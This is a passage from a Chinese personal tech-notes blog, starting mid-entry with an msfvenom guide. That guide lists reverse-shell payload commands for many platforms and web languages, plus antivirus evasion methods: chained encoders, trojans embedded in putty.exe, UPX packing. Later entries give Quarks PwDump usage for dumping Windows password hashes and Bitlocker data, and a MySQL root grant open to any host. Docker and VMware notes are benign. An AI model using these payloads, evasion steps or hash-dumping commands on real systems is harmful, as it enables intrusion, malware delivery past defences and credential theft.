动态编码器进行混淆，简单单次混淆一般都能被杀毒软件先解码再查杀识别出来，那么尝试使用 多重编码器多次混淆</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_upper -a x86 --platform windows -i5 -f raw | msfvenom -e x86/shikkata_ga_nai -a x86 --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 10 -b &#x27;\x00\x0a\xff&#x27; -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">如果进行多次编码的马儿还是被查杀，可以尝试 更换可执行文件模板，重新生成木马</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -x putty.exe -k -i 5 -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">发现更换可执行文件模板的马儿依然被查杀，编码和更换模板都行不通，可以试试 加壳。软件加壳基本原理就是对可执行文件进行加密压缩，执行之后将代码解压为原始程序，这里分别使用5、9级别upx加壳等级对木马进行加壳</span><br><span class="line"></span><br><span class="line">upx -5 shell.exe -o upx5_shell.exe</span><br><span class="line">upx -9 shell.exe -o upx9_shell.exe</span><br><span class="line"></span><br><span class="line">将木马藏在可执行文件里面，文件的md5值会发生改变，杀毒软件将文件与官方原版文件进行对比即可判断是否异常，这里 换一个不常见的可执行文件模板（可以是自己写的）</span><br><span class="line">还有可以不直接生成可执行文件，而是 生成c代码</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -i 15 -b &#x27;\x00\&#x27; -f c -o shell.c</span><br><span class="line"></span><br><span class="line">利用编译器编译生成可执行文件来绕过杀软</span><br><span class="line"></span><br><span class="line">windows平台</span><br><span class="line"></span><br><span class="line"># msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -b &#x27;\x00\x0a\xff&#x27; -i 3 -f exe -o x86_shell.exe</span><br><span class="line"># msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1</span><br><span class="line">linux平台</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf -o shell.elf</span><br><span class="line"></span><br><span class="line">mac平台</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f macho -o x86_shell.macho</span><br><span class="line"></span><br><span class="line">android平台</span><br><span class="line"></span><br><span class="line"># msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f apk -o x86_shell.apk</span><br><span class="line"></span><br><span class="line">Web Payloads</span><br><span class="line"></span><br><span class="line">PHP</span><br><span class="line"></span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.php</span><br><span class="line">ASP</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f asp -o shell.asp</span><br><span class="line">JSP</span><br><span class="line"></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.jsp</span><br><span class="line">WAR</span><br><span class="line"></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f war -o shell.war</span><br><span class="line">Script Payloads</span><br><span class="line"></span><br><span class="line">Python</span><br><span class="line"></span><br><span class="line">msfvenom -p python/meterpreter_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o rshell.py</span><br><span class="line">Perl</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.pl</span><br><span class="line">Node.js</span><br><span class="line"></span><br><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.js</span><br><span class="line">Bash</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.sh</span><br><span class="line">ruby</span><br><span class="line"></span><br><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o x86_shell.rb</span><br><span class="line">lua</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o x86_shell.lua</span><br></pre></td></tr></table></figure>
<blockquote>
<p>来源：<a target="_blank" rel="noopener" href="https://www.pa55w0rd.online/msfvenom%20_use/">https://www.pa55w0rd.online/msfvenom%20_use/</a></p>
</blockquote>
<h1 id="2022-03-19"><a href="#2022-03-19" class="headerlink" title="2022-03-19"></a>2022-03-19</h1><h2 id="mysql远程登录"><a href="#mysql远程登录" class="headerlink" title="mysql远程登录"></a>mysql远程登录</h2><ol>
<li>先在服务器中通过命令行方式（打开phpstudy界面-&gt;右下角其他菜单选项-&gt;MySQL工具-&gt;MySQL命令行）</li>
</ol>
<p>登录mysql：<code>mysql   -u root -p 密码</code> （如果mysql初始账号和密码都是root）</p>
<ol>
<li><p>执行<code>use mysql;</code></p>
</li>
<li><p>执行<code>grant all privileges on *.* to root@’%’ identified by ‘密码’;</code></p>
</li>
<li><p>执行<code>flush privileges;</code></p>
</li>
</ol>
<h1 id="2022-02-15"><a href="#2022-02-15" class="headerlink" title="2022-02-15"></a>2022-02-15</h1><h2 id="ubuntu18-04-docker配置国内镜像源"><a href="#ubuntu18-04-docker配置国内镜像源" class="headerlink" title="ubuntu18.04 docker配置国内镜像源"></a>ubuntu18.04 docker配置国内镜像源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 编辑daemon.json文件，文件不存在则新建</span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br><span class="line"> </span><br><span class="line"># 在daemon.json文件中配置网易云地址</span><br><span class="line"># 阿里云需要注册云账户</span><br><span class="line"># 中科大速度较慢，且部分docker镜像会安装失败</span><br><span class="line"># 七牛的速度也较慢</span><br><span class="line"># 综上：选择网易云镜像地址</span><br><span class="line"># 注意事项： 请将https改为http，由于https含有ssl加密机制，所以http速度能快些</span><br><span class="line"> </span><br><span class="line">&#123;&quot;registry-mirrors&quot;:[&quot;http://hub-mirror.c.163.com/&quot;]&#125;</span><br><span class="line"> </span><br><span class="line"># 重新加载daemon文件</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line"> </span><br><span class="line"># 重启docker服务</span><br><span class="line">sudo systemctl restart docker.service</span><br><span class="line"> </span><br><span class="line"># 查看是否配置成功</span><br><span class="line">sudo docker info</span><br></pre></td></tr></table></figure>
<blockquote>
<p>来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wxhou/p/14348444.html">https://www.cnblogs.com/wxhou/p/14348444.html</a></p>
</blockquote>
<h1 id="2022-02-08"><a href="#2022-02-08" class="headerlink" title="2022-02-08"></a>2022-02-08</h1><h2 id="Quarks-PwDump各种32位64系统获取HASH"><a href="#Quarks-PwDump各种32位64系统获取HASH" class="headerlink" title="Quarks PwDump各种32位64系统获取HASH"></a>Quarks PwDump各种32位64系统获取HASH</h2><p>Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。作者开发这个工具的原因是现在没有一款工具能同时抓取所有类型的hash和Bitlocker信息。这个工具没有注入任何进程，工作原理是神马呢，源代码值得读一下。</p>
<p>它目前可以导出 :<br>– Local accounts NT/LM hashes + history 本机NT/LM哈希+历史登录记录<br>– Domain accounts NT/LM hashes + history 域中的NT/LM哈希+历史登录记录<br>– Cached domain password 缓存中的域管理密码<br>– Bitlocker recovery information (recovery passwords &amp; key packages) 使用Bitlocker的恢复后遗留的信息</p>
<p>支持的操作系统 : XP/2003/Vista/7/2008/8</p>
<h3 id="USAGE"><a href="#USAGE" class="headerlink" title="USAGE"></a>USAGE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">=========</span><br><span class="line"></span><br><span class="line">Here it is how you can use Quarks PWDump:</span><br><span class="line"></span><br><span class="line">quarks-pwdump.exe&lt;option(s)&gt;</span><br><span class="line">Options :</span><br><span class="line">–dump-hash-local</span><br><span class="line">–dump-hash-domain-cached</span><br><span class="line">–dump-hash-domain (NTDS_FILE must be specified)</span><br><span class="line">–dump-bitlocker (NTDS_FILE must be specified)</span><br><span class="line">–with-history (optional)</span><br><span class="line">–output-type JOHN/LC (optional, if no=&gt;JOHN)</span><br><span class="line">–output FILE (optional, if no=&gt;stdout)</span><br><span class="line"></span><br><span class="line">Dump options must be user all at once.</span><br><span class="line">In all cases, the tool must be executed on the targeted operating system.</span><br><span class="line"></span><br><span class="line">Some command examples:</span><br><span class="line"></span><br><span class="line">– Dump domain hashes from NTDS.dit with its history</span><br><span class="line">#quarks-pwdump.exe –dump-hash-domain –with-history</span><br><span class="line"></span><br><span class="line">– Dump local account hashes to LC format</span><br><span class="line">#quarks-pwdump.exe –dump-hash-local –output-type LC</span><br><span class="line"></span><br><span class="line">– Dump domain hashes from NTDS.dit with its history</span><br><span class="line">#quarks-pwdump.exe –dump-bitlocker –output c:bitlocker.txt c:ntds.dit</span><br><span class="line"></span><br><span class="line">All features require administrator privileges.</span><br></pre></td></tr></table></figure>
<p>本机测试截图（win7 64）：</p>
<p>下载地址:<a target="_blank" rel="noopener" href="http://code.google.com/p/quarkspwdump/">http://code.google.com/p/quarkspwdump/</a> (需要翻墙下载)</p>
<p>  QuarksPwDump_v0.2b.zip (280.6 KB, 7,537 次)</p>
<blockquote>
<p>来源：<a target="_blank" rel="noopener" href="https://www.webshell.cc/4625.html">https://www.webshell.cc/4625.html</a></p>
</blockquote>
<h1 id="2022-02-05"><a href="#2022-02-05" class="headerlink" title="2022-02-05"></a>2022-02-05</h1><h2 id="VMware-Tools-ISO文件下载"><a href="#VMware-Tools-ISO文件下载" class="headerlink" title="VMware Tools ISO文件下载"></a>VMware Tools ISO文件下载</h2><ol>
<li>进入网站后 <a target="_blank" rel="noopener" href="https://packages.vmware.com/tools/esx/">https://packages.vmware.com/tools/esx/</a></li>
<li>选择VM所在的ESXi版本目录</li>
<li>选择OS版本目录</li>
<li>目录下找到VMware tools的iso文件，点击即可下载。</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://timefy.github.io">水木时</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://timefy.github.io/posts/c4046440.html">https://timefy.github.io/posts/c4046440.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://timefy.github.io" target="_blank">水木时</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9D%82%E8%AE%B0/">杂记</a><a class="post-meta__tags" href="/tags/%E5%8E%86%E5%8F%B2%E5%BD%92%E6%A1%A3/">历史归档</a></div><div class="post_share"><div class="social-share" data-image="/img/img/24.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/bb1666b8.html" title="林建入_《区块链实验课》"><img class="cover" src="/img/img/25.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">林建入_《区块链实验课》</div></div></a></div><div class="next-post pull-right"><a href="/posts/3f4ab5ae.html" title="李晓黎_《Go语言Hyperledger区块链开发实战》"><img class="cover" src="/img/img/23.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">李晓黎_《Go语言Hyperledger区块链开发实战》</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/3f4ab5ae.html" title="李晓黎_《Go语言Hyperledger区块链开发实战》"><img class="cover" src="/img/img/23.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-19</div><div class="title">李晓黎_《Go语言Hyperledger区块链开发实战》</div></div></a></div><div><a href="/posts/8bae2eef.html" title="WSL导盘"><img class="cover" src="/img/img/22.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-25</div><div class="title">WSL导盘</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/img.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">水木时</div><div class="author-info__description">以其德，悟其道</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/timefy"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">以德立身，融道于行</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-10-27"><span class="toc-number">1.</span> <span class="toc-text">2023-10-27</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%8A%A5%E9%94%99%EF%BC%9A-1067-%E2%80%93-Invalid-default-value-for-comment-date"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL报错：#1067 – Invalid default value for comment_date</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-10-03"><span class="toc-number">2.</span> <span class="toc-text">2023-10-03</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Win10%E5%AE%8C%E7%BE%8E%E5%8E%BB%E9%99%A4%E6%A1%8C%E9%9D%A2%E5%BF%AB%E6%8D%B7%E5%9B%BE%E6%A0%87%E5%B0%8F%E7%AE%AD%E5%A4%B4"><span class="toc-number">2.1.</span> <span class="toc-text">Win10完美去除桌面快捷图标小箭头</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%BB%E6%8E%89%E5%B0%8F%E7%AE%AD%E5%A4%B4"><span class="toc-number">2.1.1.</span> <span class="toc-text">去掉小箭头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E5%B0%8F%E7%AE%AD%E5%A4%B4"><span class="toc-number">2.1.2.</span> <span class="toc-text">恢复小箭头</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-08-22"><span class="toc-number">3.</span> <span class="toc-text">2023-08-22</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu-22-04%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90"><span class="toc-number">3.1.</span> <span class="toc-text">ubuntu 22.04国内镜像源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E5%8D%8E%E5%A4%A7%E5%AD%A6%E9%95%9C%E5%83%8F"><span class="toc-number">3.1.1.</span> <span class="toc-text">清华大学镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#163%E9%95%9C%E5%83%8F"><span class="toc-number">3.1.2.</span> <span class="toc-text">163镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F"><span class="toc-number">3.1.3.</span> <span class="toc-text">阿里云镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E7%A7%91%E5%A4%A7%E9%95%9C%E5%83%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">中科大镜像</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-08-15"><span class="toc-number">4.</span> <span class="toc-text">2023-08-15</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3CentOS-7%E5%87%BA%E7%8E%B0docker-compose-command-not-found"><span class="toc-number">4.1.</span> <span class="toc-text">解决CentOS 7出现docker-compose: command not found</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85docker-compose"><span class="toc-number">4.1.1.</span> <span class="toc-text">安装docker-compose</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99Docker-Compose%E8%B5%8B%E4%BA%88%E6%9D%83%E9%99%90"><span class="toc-number">4.1.2.</span> <span class="toc-text">给Docker-Compose赋予权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Docker-Compose%E6%8F%92%E4%BB%B6"><span class="toc-number">4.1.3.</span> <span class="toc-text">安装Docker-Compose插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%8C%87%E5%90%91"><span class="toc-number">4.1.4.</span> <span class="toc-text">修改指向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E7%89%88%E6%9C%AC"><span class="toc-number">4.1.5.</span> <span class="toc-text">确认版本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-08-14"><span class="toc-number">5.</span> <span class="toc-text">2023-08-14</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-nginx%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90%E9%85%8D%E7%BD%AE"><span class="toc-number">5.1.</span> <span class="toc-text">linux nginx服务器域名泛解析配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8nginx-docker%E5%AE%9E%E7%8E%B0%E5%A4%9A%E5%9F%9F%E5%90%8D%E5%8D%95%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%BB%E7%AB%AF%E5%8F%A3%E8%AE%BF%E9%97%AE"><span class="toc-number">5.2.</span> <span class="toc-text">使用nginx+docker实现多域名单服务器去端口访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E8%B5%B7"><span class="toc-number">5.2.1.</span> <span class="toc-text">源起</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88"><span class="toc-number">5.2.2.</span> <span class="toc-text">方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">5.2.3.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">5.2.4.</span> <span class="toc-text">最后</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-08-11"><span class="toc-number">6.</span> <span class="toc-text">2023-08-11</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#window-%E5%A6%82%E4%BD%95%E5%AE%8C%E6%95%B4%E7%9A%84%E5%8D%B8%E8%BD%BD-wsl-ubutun"><span class="toc-number">6.1.</span> <span class="toc-text">window 如何完整的卸载 wsl ubutun</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-08-10"><span class="toc-number">7.</span> <span class="toc-text">2023-08-10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-%E2%80%93-%E5%92%8C"><span class="toc-number">7.1.</span> <span class="toc-text">shell – ()和{}</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-02-10"><span class="toc-number">8.</span> <span class="toc-text">2023-02-10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E3%80%81CSRF%E3%80%81SSRF%E8%81%94%E7%B3%BB-amp-%E5%8C%BA%E5%88%AB%EF%BC%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">8.1.</span> <span class="toc-text">XSS、CSRF、SSRF联系&amp;区别，防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E7%B3%BB%E5%92%8C%E5%8C%BA%E5%88%AB"><span class="toc-number">8.1.1.</span> <span class="toc-text">联系和区别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%90%8C%E7%82%B9"><span class="toc-number">8.1.1.1.</span> <span class="toc-text">相同点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%82%B9"><span class="toc-number">8.1.1.2.</span> <span class="toc-text">不同点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">8.1.2.</span> <span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">8.1.2.1.</span> <span class="toc-text">xss修复方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cfrs%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">8.1.2.2.</span> <span class="toc-text">cfrs修复方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssrf%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">8.1.2.3.</span> <span class="toc-text">ssrf修复方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E8%AF%95%E9%A2%98"><span class="toc-number">8.1.3.</span> <span class="toc-text">面试题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF-%E5%92%8C-XSS-%E5%92%8C-XXE-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">8.1.3.1.</span> <span class="toc-text">CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF%E3%80%81SSRF%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">8.1.3.2.</span> <span class="toc-text">CSRF、SSRF和重放攻击有什么区别？</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-08-07"><span class="toc-number">9.</span> <span class="toc-text">2023-08-07</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pip2%E5%AE%89%E8%A3%85pwntools%E6%8A%A5%E9%94%99error-invalid-command-%E2%80%98egg-info%E2%80%98"><span class="toc-number">9.1.</span> <span class="toc-text">pip2安装pwntools报错error: invalid command ‘egg_info‘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="toc-number">9.1.1.</span> <span class="toc-text">报错信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%EF%BC%9A%E5%AE%89%E8%A3%85setuptools"><span class="toc-number">9.1.2.</span> <span class="toc-text">解决办法：安装setuptools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85pwntools"><span class="toc-number">9.1.3.</span> <span class="toc-text">重新安装pwntools</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python2%E5%AE%89%E8%A3%85pip%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">9.2.</span> <span class="toc-text">Python2安装pip的方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-08-03"><span class="toc-number">10.</span> <span class="toc-text">2023-08-03</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bind-for-0-0-0-0-80-failed-port-is-already-allocated-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">10.1.</span> <span class="toc-text">Bind for 0.0.0.0:80 failed: port is already allocated.解决方案</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-08-01"><span class="toc-number">11.</span> <span class="toc-text">2023-08-01</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hping3%E5%91%BD%E4%BB%A4-%E2%80%93-%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%8F%8A%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%AE%89%E5%85%A8"><span class="toc-number">11.1.</span> <span class="toc-text">hping3命令 – 测试网络及主机的安全</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-04-18"><span class="toc-number">12.</span> <span class="toc-text">2022-04-18</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom-%E4%BD%BF%E7%94%A8"><span class="toc-number">12.1.</span> <span class="toc-text">msfvenom 使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">12.1.1.</span> <span class="toc-text">木马连接方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom-%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9"><span class="toc-number">12.1.2.</span> <span class="toc-text">msfvenom 常用选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8msf%E5%88%9B%E5%BB%BA%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">12.1.3.</span> <span class="toc-text">使用msf创建监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAMetasploit-payload"><span class="toc-number">12.1.4.</span> <span class="toc-text">创建Metasploit payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-03-19"><span class="toc-number">13.</span> <span class="toc-text">2022-03-19</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="toc-number">13.1.</span> <span class="toc-text">mysql远程登录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-02-15"><span class="toc-number">14.</span> <span class="toc-text">2022-02-15</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 